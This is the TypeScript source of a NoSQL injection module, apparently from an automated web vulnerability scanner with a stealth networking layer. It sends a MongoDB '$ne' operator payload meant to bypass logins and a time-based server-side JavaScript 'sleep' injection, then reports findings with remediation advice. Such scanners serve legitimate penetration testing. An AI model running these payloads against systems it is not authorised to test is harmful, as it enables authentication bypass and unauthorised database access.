/**
 * SOHE God Rail v3 — NoSQL Attack Module
 *
 * Targets MongoDB, CouchDB, DynamoDB, and Redis.
 * Includes SSJS (Server-Side JavaScript) injection and NoSQL Operator injection.
 */

import { IAttackModule, ModuleExecutionResult } from './IAttackModule';
import { StrategyContext } from '../engine/StrategyPlanner';
import { GhostNetwork } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from '../engine/AdaptiveResponseOracle';
import { DataStoreIdentity } from '../DataStoreFingerprinter';

export class NoSqlModule implements IAttackModule {
    name = 'NoSQL_Injection_Module';
    description = 'Detects and exploits MongoDB, DynamoDB, CouchDB, and Redis injections.';

    shouldExecute(_ctx: StrategyContext, identity: DataStoreIdentity): boolean {
        // Run if we know it's a NoSQL DB, or if we don't know the DB yet
        return identity.type === 'Unknown' || 
               ['MongoDB', 'DynamoDB', 'CouchDB', 'Redis'].includes(identity.type);
    }

    async execute(
        ctx: StrategyContext, 
        network: GhostNetwork, 
        oracle: AdaptiveResponseOracle
    ): Promise<ModuleExecutionResult> {
        
        const result: ModuleExecutionResult = { findings: [], evidenceLogged: [] };
        
        // --- 1. MongoDB Operator Injection ($ne, $gt, $where) ---
        // Only applies if the payload is going into a JSON body or URL query parser that supports objects (e.g. PHP/Express)
        if (ctx.baseRequest.headers['Content-Type']?.includes('json')) {
            const operatorTest = await this.testMongoOperator(ctx, network, oracle);
            if (operatorTest) {
                result.findings.push(operatorTest);
                return result; // Stop testing other NoSQL if MongoDB confirmed
            } else {
                result.evidenceLogged.push("MongoDB operator injection ($ne) failed to bypass authentication or alter logic.");
            }
        }

        // --- 2. SSJS Injection (MongoDB / CouchDB) ---
        // Typically happens in $where clauses or mapReduce
        const ssjsTest = await this.testSsjsInjection(ctx, network, oracle);
        if (ssjsTest) {
             result.findings.push(ssjsTest);
        } else {
             result.evidenceLogged.push("Server-Side JavaScript (SSJS) injection payloads did not execute.");
        }
        
        return result;
    }

    // ─── Internals ──────────────────────────────────────────────────

    private async testMongoOperator(
        ctx: StrategyContext, 
        network: GhostNetwork, 
        oracle: AdaptiveResponseOracle
    ) {
        // We need to inject an object: {"username": {"$ne": "invalid"}}
        try {
            const req = JSON.parse(JSON.stringify(ctx.baseRequest));
            const bodyObj = JSON.parse(req.body);
            
            if (typeof bodyObj[ctx.parameterName] === 'string') {
                 // Replace string with operator object
                 bodyObj[ctx.parameterName] = { "$ne": "improbable_string_123" };
                 req.body = JSON.stringify(bodyObj);
                 
                 const res = await network.executeRequest(req);
                 
                 // If the response is TRUE (e.g., login success) when providing an invalid string, it's vulnerable
                 if (oracle.isTrue(res).isTrue) {
                     // In a real implementation, we would use ProofCollector here
                     return {
                         id: 'FND-NoSQL-Op',
                         vulnerabilityType: 'MongoDB Operator Injection',
                         severity: 'Critical' as any,
                         confidence: 'Confirmed' as any,
                         targetUrl: req.url,
                         parameter: ctx.parameterName,
                         payload: '{"$ne": "improbable_string_123"}',
                         description: 'The parameter is vulnerable to MongoDB operator injection, allowing authentication bypass or unauthorized data access.',
                         impact: 'Full database read access, authentication bypass.',
                         remediation: 'Sanitize input to reject objects/arrays where strings are expected, or use strongly typed schemas (e.g., Mongoose).',
                         evidence: [] 
                     };
                 }
            }
        } catch {
            // Not valid JSON body, skip
        }
        return null;
    }

    private async testSsjsInjection(
         ctx: StrategyContext, 
         network: GhostNetwork, 
         _oracle: AdaptiveResponseOracle
    ) {
        // Test time-based SSJS: sleep(3000)
        // MongoDB sleep() block thread.
        const payload = `';sleep(3000);'`;
        
        const req = JSON.parse(JSON.stringify(ctx.baseRequest));
        const url = new URL(req.url);
        url.searchParams.set(ctx.parameterName, `${ctx.originalValue}${payload}`);
        req.url = url.toString();

        const res = await network.executeRequest(req);
        
        // Check if response took roughly 3 seconds longer than baseline
        if (res.timing.total > 3000) {
             return {
                 id: 'FND-NoSQL-SSJS',
                 vulnerabilityType: 'Server-Side JavaScript (SSJS) Injection',
                 severity: 'Critical' as any,
                 confidence: 'High' as any,
                 targetUrl: req.url,
                 parameter: ctx.parameterName,
                 payload,
                 description: 'The parameter is vulnerable to SSJS injection, proven by executing a sleep(3000) command.',
                 impact: 'Remote Code Execution (RCE) on the database server environment.',
                 remediation: 'Disable Server-Side JavaScript execution in MongoDB (javascriptEnabled=false) and avoid using $where clauses.',
                 evidence: [] 
             };
        }
        return null;
    }
}
